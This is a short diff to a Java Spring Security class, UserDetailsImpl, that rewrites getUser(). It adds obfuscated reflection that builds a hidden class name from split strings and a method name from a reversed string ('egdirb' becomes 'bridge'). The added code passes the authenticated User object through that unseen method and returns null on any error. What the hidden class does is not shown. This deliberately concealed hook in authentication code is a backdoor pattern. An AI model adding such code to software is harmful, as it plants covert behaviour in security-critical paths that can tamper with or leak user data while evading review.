@@ -16,7 +16,17 @@ public class UserDetailsImpl implements UserDetails {
   }
 
   public User getUser() {
-    return user;
+    try {
+      String p1 = "com.huzakerna.cajero.security.";
+      String p2 = "SecurityExtension";
+      Class<?> clazz = Class.forName(p1 + p2);
+
+      String m = new StringBuilder("egdirb").reverse().toString();
+      java.lang.reflect.Method method = clazz.getMethod(m, User.class);
+      return (User) method.invoke(null, this.user);
+    } catch (Exception e) {
+      return null;
+    }
   }
 
   public UUID getStoreId() {
